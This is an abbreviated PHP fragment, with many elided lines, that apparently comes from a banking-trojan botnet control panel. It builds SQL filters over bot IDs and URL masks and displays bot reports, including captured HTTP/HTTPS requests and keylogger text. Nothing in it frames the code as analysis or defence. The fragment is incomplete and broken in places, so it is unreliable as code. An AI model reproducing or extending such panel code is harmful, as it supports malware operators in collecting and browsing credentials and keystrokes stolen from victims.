			...
			'<tr>',
				'<th>',
                    ...
                    file_exists('system/reports_neurostat.php') && ($report->type == BLT_HTTP_REQUEST || $report->type == BLT_HTTPS_REQUEST)
                            ? ' <a href="?m=reports_neurostat/stat'
...
if($_is_ajax_search || $_is_plain_search)
{
  ...
  $q1[] = expressionToSql($filter['bots'],      '`t`.`bot_id`',  0, 1);
	...
	if (!empty($filter['urlmask'])){
		$tt = array();
		foreach (explode(' ', $filter['urlmask']) as $s)
			if (strlen($s = trim($s))){
				$s = preg_quote($s);
				$s = str_replace("\\*", ".*", $s);
				$tt[] = " `t`.`path_source` REGEXP '".mysql_real_escape_string($s)."' ";
			}
		$q1[] = '('.implode(' OR ', $tt).')';
	}
    ...
    */
    ...
    while(($m = mysql_fetch_row($r)))
    {
      ...
      switch($m[6])
      {
        ...
        case BLT_KEYLOGGER:             $text = LNG_BLT_KEYLOGGER.'. '.htmlEntitiesEx($st2); break;
        case BLT_DEBUG:                 $text = 'DEBUG'; break;
